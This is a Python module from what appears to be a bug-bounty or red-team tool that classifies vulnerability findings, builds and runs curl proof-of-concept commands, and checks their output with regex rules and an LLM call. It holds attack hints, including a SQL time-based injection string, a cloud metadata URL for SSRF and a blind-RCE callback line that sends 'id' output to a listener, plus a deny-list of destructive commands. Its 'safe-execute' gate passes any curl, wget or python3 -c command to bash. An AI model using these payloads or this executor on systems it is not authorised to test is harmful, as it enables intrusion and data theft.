"""PoC Verifier — generates or proposes proof-of-concept for LE findings.

For each finding in LE mode:
1. Attempt to auto-generate a reproducible PoC (curl command, script, etc.)
2. If auto-PoC works → mark CONFIRMED with the PoC script
3. If auto-PoC fails → mark UNCONFIRMED or MANUAL_REQUIRED with instructions

This is the difference between a dupe and a first — bug bounty programs
want a clean, reproducible PoC, not just a description.

PoC types by finding class:
  - Web vulns (XSS, SQLi, SSRF, IDOR): curl/httpie one-liner + expected output
  - Auth issues: step-by-step request sequence
  - Misconfigs: single command demonstrating the issue
  - Service vulns: exploit script or CVE PoC reference
  - Logic bugs: numbered request sequence with diffs
"""

import json
import re
import subprocess
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path

from findings_db import Finding, FindingsDB, PocStatus


# ---------------------------------------------------------------------------
# PoC templates by vulnerability class
# ---------------------------------------------------------------------------

_POC_TEMPLATES: dict[str, str] = {
    "sqli": (
        "# SQL Injection PoC\n"
        "# Target: {host}:{port} {service}\n"
        "# Parameter: {param}\n\n"
        "curl -sk '{url}' \\\n"
        "  -d '{payload}' \\\n"
        "  --proxy http://127.0.0.1:8080  # optional: route through Burp\n\n"
        "# Expected: {expected}\n"
        "# Confirm by checking for: time delay, error message, or data exfiltration"
    ),
    "xss": (
        "# Reflected/Stored XSS PoC\n"
        "# Target: {host}:{port}\n\n"
        "curl -sk '{url}' | grep -o '<script>alert.*</script>'\n\n"
        "# Or open in browser:\n"
        "# {url}\n"
        "# Expected: JavaScript execution in browser context"
    ),
    "ssrf": (
        "# SSRF PoC\n"
        "# Target: {host}:{port}\n\n"
        "# Step 1: Start listener\n"
        "python3 -m http.server 8888 &\n\n"
        "# Step 2: Trigger SSRF\n"
        "curl -sk '{url}' \\\n"
        "  -d '{payload}'\n\n"
        "# Expected: HTTP request received on listener from target server"
    ),
    "idor": (
        "# IDOR PoC\n"
        "# Target: {host}:{port}\n\n"
        "# Step 1: Authenticate as User A\n"
        "TOKEN_A=$(curl -sk '{auth_url}' -d 'user=A&pass=...' | jq -r '.token')\n\n"
        "# Step 2: Access User B's resource with User A's token\n"
        "curl -sk '{resource_url}' \\\n"
        "  -H \"Authorization: Bearer $TOKEN_A\"\n\n"
        "# Expected: User B's data returned (should be 403)"
    ),
    "rce": (
        "# Remote Code Execution PoC\n"
        "# Target: {host}:{port}\n\n"
        "# NON-DESTRUCTIVE proof only — execute `id` or `hostname`\n"
        "curl -sk '{url}' \\\n"
        "  -d '{payload}'\n\n"
        "# Expected: command output (uid=, hostname, etc.) in response"
    ),
    "auth_bypass": (
        "# Authentication Bypass PoC\n"
        "# Target: {host}:{port}\n\n"
        "# Without credentials:\n"
        "curl -sk '{url}' -v\n\n"
        "# Expected: access to authenticated content/functionality\n"
        "# Compare response with authenticated request to confirm bypass"
    ),
    "info_disclosure": (
        "# Information Disclosure PoC\n"
        "# Target: {host}:{port}\n\n"
        "curl -sk '{url}'\n\n"
        "# Expected: sensitive data in response (credentials, internal IPs, stack traces, etc.)"
    ),
    "generic": (
        "# Vulnerability PoC\n"
        "# Target: {host}:{port} {service}\n"
        "# Finding: {title}\n\n"
        "# Reproduction steps:\n"
        "# 1. {step1}\n"
        "# 2. Observe: {expected}\n"
    ),
}


# ---------------------------------------------------------------------------
# PoC classification — map finding description to vuln class
# ---------------------------------------------------------------------------

_VULN_CLASSIFIERS: list[tuple[str, re.Pattern]] = [
    ("sqli", re.compile(r"sql\s*inject|sqli|union\s+select|blind\s+sql|error.based.sql", re.I)),
    ("xss", re.compile(r"\bxss\b|cross.site\s*script|reflected.*script|stored.*script|dom.based", re.I)),
    ("ssrf", re.compile(r"\bssrf\b|server.side\s*request|internal\s+service\s+access", re.I)),
    ("idor", re.compile(r"\bidor\b|insecure\s+direct|access\s+control|horizontal.*escalat|other.*user", re.I)),
    ("rce", re.compile(r"\brce\b|remote\s+code|command\s*inject|os\s*command|code\s+execution", re.I)),
    ("auth_bypass", re.compile(r"auth.*bypass|bypass.*auth|unauth.*access|missing.*auth|broken.*auth", re.I)),
    ("info_disclosure", re.compile(r"info.*disclos|information.*leak|data.*expos|sensitive.*data|stack\s*trace|\.git.*expos", re.I)),
]


def classify_finding(finding: Finding) -> str:
    """Determine vulnerability class from finding title/description."""
    text = f"{finding.title} {finding.description} {finding.finding_type}"
    for vuln_class, pattern in _VULN_CLASSIFIERS:
        if pattern.search(text):
            return vuln_class
    return "generic"


# ---------------------------------------------------------------------------
# PoC extraction from evidence
# ---------------------------------------------------------------------------

def extract_poc_from_evidence(finding: Finding) -> str:
    """Try to extract a reproducible PoC from the finding's evidence text.

    Looks for curl commands, HTTP requests, code snippets that can be
    directly replayed.
    """
    evidence = f"{finding.evidence} {finding.description}"

    # Look for curl commands — grab full command, stop at prose boundaries
    curl_match = re.search(
        r"(curl\s+[^\n]*?https?://[^\n]*?)(?:\s+(?:returned|shows?|response|output|result)[:\s]|$|\n)",
        evidence, re.IGNORECASE
    )
    if curl_match:
        cmd = curl_match.group(1).strip().rstrip(".,;")
        return cmd
    # Fallback: grab curl to end of line
    curl_match2 = re.search(r"(curl\s+\S+.*)", evidence, re.IGNORECASE)
    if curl_match2:
        cmd = curl_match2.group(1).strip().rstrip(".,;")
        if re.search(r'https?://', cmd):
            return cmd

    # Look for HTTP requests (method + URL pattern)
    http_match = re.search(
        r'((?:GET|POST|PUT|DELETE|PATCH)\s+https?://\S+)',
        evidence
    )
    if http_match:
        method_url = http_match.group(1)
        parts = method_url.split(maxsplit=1)
        return f"curl -sk -X {parts[0]} '{parts[1]}'"

    # Look for python/bash one-liners
    script_match = re.search(
        r'(python3?\s+-c\s+[\'"][^\n]{10,500})',
        evidence
    )
    if script_match:
        return script_match.group(1).strip()

    return ""


# ---------------------------------------------------------------------------
# PoC attempt — try to verify the finding is reproducible
# ---------------------------------------------------------------------------

def attempt_poc(finding: Finding, evidence_dir: Path | None = None) -> dict:
    """Attempt to create a reproducible PoC for a finding.

    Returns dict with:
        status: confirmed | unconfirmed | manual_required
        poc_script: the PoC command/script (if confirmed or proposed)
        instructions: manual steps for operator (if manual_required)
        reason: why this status was assigned
    """
    vuln_class = classify_finding(finding)

    # Step 1: Try to extract existing PoC from evidence
    extracted_poc = extract_poc_from_evidence(finding)

    # Classify for validation criteria
    _open_redirect_class = bool(re.search(
        r"open\s*redirect|redirect_uri|unvalidated\s+redirect", vuln_class + finding.title + finding.description, re.I
    ))
    effective_class = "open_redirect" if _open_redirect_class else vuln_class

    _takeover_class = bool(re.search(
        r"subdomain\s*takeover|dangling\s*cname|takeover", finding.title + finding.description, re.I
    ))
    if _takeover_class:
        effective_class = "subdomain_takeover"

    if extracted_poc:
        # Execute the PoC command
        executed, output = _execute_poc_command(extracted_poc)
        if executed:
            # Validate whether the output actually proves the finding
            status, reason = _validate_poc_output(
                finding, extracted_poc, output, effective_class
            )
            poc_path = ""
            if status == PocStatus.CONFIRMED and evidence_dir:
                poc_path = _save_poc_script(
                    finding, extracted_poc, output, evidence_dir
                )
            if status != PocStatus.MANUAL:
                return {
                    "status": status,
                    "poc_script": extracted_poc,
                    "instructions": "" if status == PocStatus.CONFIRMED else reason,
                    "reason": reason,
                    "poc_path": poc_path,
                }

    # Step 2: Build a PoC from the finding metadata
    generated_poc = _generate_poc(finding, vuln_class)

    if generated_poc:
        executed, output = _execute_poc_command(generated_poc)
        if executed:
            status, reason = _validate_poc_output(
                finding, generated_poc, output, effective_class
            )
            poc_path = ""
            if status == PocStatus.CONFIRMED and evidence_dir:
                poc_path = _save_poc_script(
                    finding, generated_poc, output, evidence_dir
                )
            if status != PocStatus.MANUAL:
                return {
                    "status": status,
                    "poc_script": generated_poc,
                    "instructions": "" if status == PocStatus.CONFIRMED else reason,
                    "reason": reason,
                    "poc_path": poc_path,
                }

    # Step 3: Can't auto-verify — generate manual instructions
    instructions = _build_manual_instructions(finding, vuln_class, extracted_poc or generated_poc)

    return {
        "status": PocStatus.MANUAL,
        "poc_script": extracted_poc or generated_poc or "",
        "instructions": instructions,
        "reason": f"Could not auto-verify — {vuln_class} finding requires manual PoC",
        "poc_path": "",
    }


def _execute_poc_command(cmd: str, timeout: int = 15) -> tuple[bool, str]:
    """Execute a PoC command safely and return raw output.

    Only runs safe commands (curl, HTTP requests). Refuses anything destructive.
    Returns (executed_ok, output).  Note: executed_ok means the command ran
    and produced output — NOT that the vulnerability is confirmed.
    """
    # Safety gate — only run read-only commands
    cmd_lower = cmd.lower().strip()
    if not cmd_lower.startswith(("curl ", "wget ", "http ", "python3 -c")):
        return False, "Skipped — command type not in safe-execute list"

    # Block destructive patterns
    dangerous = re.compile(
        r'rm\s|mkfs|dd\s+if=|>\s*/dev|shutdown|reboot|kill|'
        r'DROP\s+TABLE|DELETE\s+FROM|UPDATE\s+.*SET',
        re.IGNORECASE
    )
    if dangerous.search(cmd):
        return False, "Blocked — destructive pattern detected"

    try:
        result = subprocess.run(
            ["bash", "-c", cmd],
            capture_output=True, text=True, timeout=timeout,
        )
        output = result.stdout + result.stderr

        if len(output.strip()) > 10:
            return True, output[:3000]

        return False, output[:500] if output else "No output"
    except subprocess.TimeoutExpired:
        return False, f"Timeout after {timeout}s"
    except Exception as e:
        return False, str(e)


# What "confirmed" looks like for each vuln class — patterns in the PoC output
# that prove the vulnerability is real, not just that the endpoint exists.
_CONFIRMATION_CRITERIA: dict[str, dict] = {
    "open_redirect": {
        "positive": [
            r"location:\s*https?://(evil|attacker|burp)",  # Server redirects to attacker URL
        ],
        "negative": [
            r"(page\s+not\s+found|not\s+found|404)",       # Endpoint doesn't exist
            r"<html.*</html>",                              # Got HTML page, not redirect
        ],
        "description": "Must show Location header pointing to attacker URL, or user landing on attacker domain",
    },
    "subdomain_takeover": {
        "positive": [
            r"(content\s+served|claimed|our\s+content|takeover\s+confirmed)",
        ],
        "negative": [
            r"(unknown\s+domain|not\s+found|no\s+such)",    # Dangling but not claimed
        ],
        "description": "Must demonstrate content control, not just dangling DNS",
    },
    "sqli": {
        "positive": [
            r"(syntax\s+error.*SQL|mysql|postgres|sqlite|UNION\s+SELECT.*returned)",
            r"(sleep|benchmark|pg_sleep)\s*\(",              # Time-based confirmed
        ],
        "negative": [
            r"(no\s+results?|0\s+rows?|empty)",
        ],
        "description": "Must show SQL error with DB fingerprint, time delay, or extracted data",
    },
    "xss": {
        "positive": [
            r"(<script|alert\(|onerror=|onload=)",
        ],
        "negative": [
            r"(Content-Security-Policy|X-XSS-Protection:\s*1)",
        ],
        "description": "Must show payload in response body without CSP blocking execution",
    },
    "ssrf": {
        "positive": [
            r"(callback\s+received|request\s+from\s+target|listener\s+hit)",
        ],
        "negative": [
            r"(connection\s+refused|timeout|ECONNREFUSED)",
        ],
        "description": "Must show inbound request on listener from target server, not just parameter reflection",
    },
    "auth_bypass": {
        "positive": [
            r"(authenticated|admin|dashboard|profile|account)",
        ],
        "negative": [
            r"(401|403|unauthorized|forbidden|login\s+required|access\s+denied)",
        ],
        "description": "Must show access to protected resources without credentials",
    },
    "info_disclosure": {
        "positive": [
            r"(password|secret|api[_-]?key|private[_-]?key|BEGIN\s+(RSA|EC|PRIVATE))",
        ],
        "negative": [
            r"(public[_-]?key|jwk|\.well-known)",           # Public keys are by design
        ],
        "description": "Must show sensitive data (secrets, private keys, PII), not public info",
    },
}


def _validate_poc_output(finding: Finding, poc_cmd: str, output: str,
                         vuln_class: str) -> tuple[str, str]:
    """Validate whether PoC output actually proves the vulnerability.

    Goes beyond 'did the command run' to check whether the output
    demonstrates the claimed vulnerability. Uses class-specific criteria
    and LLM analysis for ambiguous cases.

    Returns (status, reason) where status is confirmed/unconfirmed/manual_required.
    """
    output_lower = output.lower()

    # --- Quick structural checks ---
    # HTML error pages are almost never proof of a vulnerability
    is_html_error = bool(re.search(
        r"<html.*?(not\s+found|error|sorry|page\s+you\s+requested)", output, re.I | re.S
    ))
    if is_html_error and vuln_class not in ("xss",):
        return PocStatus.UNCONFIRMED, (
            "PoC returned HTML error page — endpoint may not exist or returned "
            "generic error. This does not demonstrate the vulnerability."
        )

    # 500/503 errors without vuln-specific content
    is_server_error = bool(re.search(r"\b(500|502|503)\b", output))
    if is_server_error and vuln_class not in ("sqli",):
        return PocStatus.UNCONFIRMED, (
            "PoC triggered a server error (5xx) but this does not prove exploitation. "
            "A crash is not proof of a vulnerability."
        )

    # --- Class-specific validation ---
    criteria = _CONFIRMATION_CRITERIA.get(vuln_class, {})
    if criteria:
        positive_patterns = criteria.get("positive", [])
        negative_patterns = criteria.get("negative", [])

        has_positive = any(
            re.search(p, output_lower) for p in positive_patterns
        )
        has_negative = any(
            re.search(p, output_lower) for p in negative_patterns
        )

        if has_positive and not has_negative:
            return PocStatus.CONFIRMED, (
                f"PoC output matches {vuln_class} confirmation criteria: "
                f"{criteria['description']}"
            )

        if has_negative and not has_positive:
            return PocStatus.UNCONFIRMED, (
                f"PoC output matches {vuln_class} NEGATIVE indicators — "
                f"response suggests the vulnerability is not exploitable. "
                f"{criteria['description']}"
            )

    # --- LLM-based validation for ambiguous cases ---
    # Use a fast model to judge whether the output proves the finding
    try:
        from config import MODEL_FAST
        validation_prompt = f"""You are a bug bounty finding validator. Determine if this PoC output PROVES the claimed vulnerability.

FINDING: {finding.title}
SEVERITY: {finding.severity}
DESCRIPTION: {finding.description[:500]}
VULNERABILITY CLASS: {vuln_class}

POC COMMAND: {poc_cmd}

POC OUTPUT:
{output[:2000]}

VALIDATION RULES:
- "Parameter present in URL" does NOT prove open redirect — user must LAND on attacker URL
- "Dangling CNAME" does NOT prove subdomain takeover — must demonstrate content control
- "Server error (500)" does NOT prove injection — must show data extraction or expression evaluation
- "Response received" does NOT prove SSRF — must show inbound request from TARGET on your listener
- "Public JWK endpoint" is NOT information disclosure — public keys are meant to be public
- "HTML error page" usually means the endpoint doesn't work, not that the vulnerability is confirmed

Respond with ONLY one of:
CONFIRMED: [one-line reason why the output proves the vulnerability]
UNCONFIRMED: [one-line reason why the output does NOT prove the vulnerability]
MANUAL: [one-line reason why human judgment is needed]"""

        result = subprocess.run(
            ["claude", "-p", "--output-format", "text", "--max-turns", "1",
             "--model", MODEL_FAST],
            input=validation_prompt, capture_output=True, text=True, timeout=30,
        )

        if result.returncode == 0 and result.stdout.strip():
            verdict = result.stdout.strip().split("\n")[0]
            if verdict.startswith("CONFIRMED:"):
                return PocStatus.CONFIRMED, verdict
            elif verdict.startswith("UNCONFIRMED:"):
                return PocStatus.UNCONFIRMED, verdict
            elif verdict.startswith("MANUAL:"):
                return PocStatus.MANUAL, verdict

    except Exception:
        pass

    # Fallback: if we couldn't determine, mark as manual
    return PocStatus.MANUAL, (
        f"Could not automatically validate {vuln_class} finding — "
        f"PoC produced output but confirmation criteria inconclusive"
    )


def _verify_poc_command(cmd: str, timeout: int = 15) -> tuple[bool, str]:
    """Legacy wrapper — execute command and return raw output.

    Use _validate_poc_output() for actual vulnerability validation.
    """
    return _execute_poc_command(cmd, timeout)


def _generate_poc(finding: Finding, vuln_class: str) -> str:
    """Generate a PoC command from finding metadata."""
    # Extract URL/endpoint from evidence or description
    url_match = re.search(r'(https?://\S+)', f"{finding.evidence} {finding.description}")
    url = url_match.group(1).rstrip(".,;)") if url_match else ""

    if not url and finding.host:
        port = finding.port or 80
        scheme = "https" if port == 443 else "http"
        url = f"{scheme}://{finding.host}:{port}/"

    if not url:
        return ""

    if vuln_class == "info_disclosure":
        return f"curl -sk '{url}'"
    elif vuln_class == "auth_bypass":
        return f"curl -sk -v '{url}'"
    elif vuln_class == "xss":
        return f"curl -sk '{url}' | grep -i '<script'"
    elif vuln_class in ("sqli", "rce", "ssrf"):
        # These need the specific payload — can't generate blindly
        # Return the URL as a starting point
        return f"curl -sk -v '{url}'"
    else:
        return f"curl -sk '{url}'"


def _build_manual_instructions(finding: Finding, vuln_class: str,
                                proposed_poc: str = "") -> str:
    """Build operator-facing manual PoC instructions."""
    lines = [
        f"## Manual PoC Required: {finding.title}",
        f"**Severity:** {finding.severity}",
        f"**Host:** {finding.host}:{finding.port or '?'}",
        f"**Type:** {vuln_class}",
        "",
        "### Why manual verification is needed",
        f"The automated PoC could not confirm this finding. Possible reasons:",
        "- The vulnerability requires authentication/session state",
        "- The exploit depends on timing or race conditions",
        "- The payload needs browser-side execution (XSS, clickjacking)",
        "- Network conditions changed since discovery",
        "",
        "### Proposed PoC approach",
    ]

    if proposed_poc:
        lines.append(f"```bash\n{proposed_poc}\n```")
        lines.append("")
        lines.append("This command was generated but could not be verified automatically.")
        lines.append("Try running it manually and checking for:")
    else:
        lines.append("No automated PoC could be generated.")
        lines.append("")
        lines.append("### Suggested reproduction steps")

    # Class-specific guidance
    if vuln_class == "sqli":
        lines.extend([
            "1. Identify the injectable parameter from the evidence",
            "2. Use sqlmap for automated verification:",
            f"   `sqlmap -u '{finding.host}' --batch --level 3`",
            "3. Or test manually with time-based blind: `' AND SLEEP(5)--`",
            "4. Document: response time difference or error message",
        ])
    elif vuln_class == "xss":
        lines.extend([
            "1. Open the URL in a browser (Firefox recommended)",
            "2. Check if the payload executes in the DOM",
            "3. For stored XSS: submit the payload, then visit the reflected page",
            "4. Screenshot the alert/console output as evidence",
        ])
    elif vuln_class == "ssrf":
        lines.extend([
            "1. Start a listener: `python3 -m http.server 8888`",
            "2. Submit a request pointing to your listener IP",
            "3. Check if the target server makes the request",
            "4. Try accessing internal services: `http://169.254.169.254/latest/meta-data/`",
        ])
    elif vuln_class == "idor":
        lines.extend([
            "1. Create two test accounts (A and B) if possible",
            "2. Authenticate as A, note the session token",
            "3. Access B's resource using A's token",
            "4. Document: response shows B's data with A's auth",
        ])
    elif vuln_class == "rce":
        lines.extend([
            "1. Use a non-destructive proof: `id`, `hostname`, or `echo REDOPS_POC`",
            "2. Verify command output appears in the response",
            "3. For blind RCE: use `curl <your-ip>:8888/$(id)` with a listener",
            "4. Screenshot the command output as evidence",
        ])
    elif vuln_class == "auth_bypass":
        lines.extend([
            "1. Send the request without authentication headers",
            "2. Compare response with an authenticated request",
            "3. Document: what data/functionality is accessible without auth",
        ])
    else:
        lines.extend([
            "1. Review the evidence in the finding description",
            "2. Attempt to reproduce the exact conditions described",
            "3. Capture request/response pairs as evidence",
            "4. Document exact steps for the bug bounty report",
        ])

    lines.extend([
        "",
        "### Evidence needed for submission",
        "- HTTP request/response pairs (use Burp or curl -v)",
        "- Screenshots of impact (data accessed, code executed)",
        "- Video recording if the attack requires multiple steps",
    ])

    return "\n".join(lines)


def _save_poc_script(finding: Finding, poc_cmd: str, output: str,
                     evidence_dir: Path) -> str:
    """Save a verified PoC script to the evidence directory."""
    safe_title = re.sub(r'[^a-zA-Z0-9_-]', '_', finding.title[:40]).strip("_")
    filename = f"poc_{safe_title}.sh"
    path = evidence_dir / filename

    content = [
        "#!/bin/bash",
        f"# PoC for: {finding.title}",
        f"# Severity: {finding.severity}",
        f"# Host: {finding.host}:{finding.port or '?'}",
        f"# Generated: {datetime.now().isoformat()[:19]}",
        f"# Status: CONFIRMED — this PoC was verified automatically",
        "",
        poc_cmd,
        "",
        "# Expected output (truncated):",
    ]
    for line in output.strip().splitlines()[:20]:
        content.append(f"# {line}")

    path.write_text("\n".join(content))
    try:
        path.chmod(0o755)
    except Exception:
        pass
    return str(path)


# ---------------------------------------------------------------------------
# Batch verification — process all pending findings for an engagement
# ---------------------------------------------------------------------------

def verify_pending_findings(findings_db: FindingsDB, evidence_dir: Path,
                            host: str | None = None,
                            on_status=None) -> dict:
    """Run PoC verification on all pending findings.

    Returns summary dict with counts per status.
    """
    pending = findings_db.get_pending_poc(host=host, min_severity="low")

    if not pending:
        if on_status:
            on_status("[poc] No pending findings to verify")
        return {"total": 0, "confirmed": 0, "unconfirmed": 0, "manual": 0}

    if on_status:
        on_status(f"[poc] Verifying {len(pending)} pending findings...")

    stats = {"total": len(pending), "confirmed": 0, "unconfirmed": 0, "manual": 0}

    for row in pending:
        finding = Finding(
            host=row["host"],
            port=row.get("port"),
            service=row.get("service", ""),
            finding_type=row.get("finding_type", ""),
            severity=row.get("severity", "info"),
            title=row.get("title", ""),
            description=row.get("description", ""),
            evidence=row.get("evidence", ""),
            evidence_path=row.get("evidence_path", ""),
            cve_id=row.get("cve_id", ""),
            agent=row.get("agent", ""),
        )

        if on_status:
            on_status(f"[poc] Verifying: {finding.title[:60]} ({finding.severity})")

        result = attempt_poc(finding, evidence_dir=evidence_dir)

        # Update the finding in the DB
        findings_db.update_poc(
            finding_id=row["id"],
            poc_status=result["status"],
            poc_script=result["poc_script"],
            poc_instructions=result["instructions"],
        )

        stats[result["status"].replace("manual_required", "manual")] += 1

        if on_status:
            status_label = result["status"].upper()
            on_status(f"[poc]   → {status_label}: {result['reason']}")

    return stats
